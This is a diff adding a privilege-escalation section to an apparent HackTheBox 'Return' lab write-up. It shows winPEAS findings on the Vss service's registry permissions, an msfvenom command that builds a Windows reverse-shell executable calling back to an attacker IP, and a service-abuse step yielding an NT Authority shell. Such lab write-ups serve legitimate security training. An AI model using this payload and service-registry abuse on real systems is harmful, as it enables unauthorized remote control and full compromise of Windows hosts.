@@ -127,4 +127,26 @@ we login winrm using the creds
 
 ## Privilege Escalation 
 
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fbe94d1e-b9b6-4ed3-aedd-4a7d50b74167)
 
+running winpeas.exe, we can see we can modify some service registery 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/04c2a2aa-b190-496e-8d9d-75c6ab97b779)
+
+running sc qc to query info about the `Vss` service, we can see it is run by localsystem, let's try to abuse ![Abuse](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services-registry-modify-permissions)
+
+```shell
+┌──(n16hth4wk👽n16hth4wk-sec)-[~/Documents/HTB/Return]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.34 LPORT=443 -f exe -o reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: reverse.exe
+```
+first generate an msfvenom reverse shell payload. and send to the target.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d9d38dae-0a68-4cbd-8f93-ae20d835b33c)
+
+use the abuse function and restart the service, boom we got shell as NT Authority 
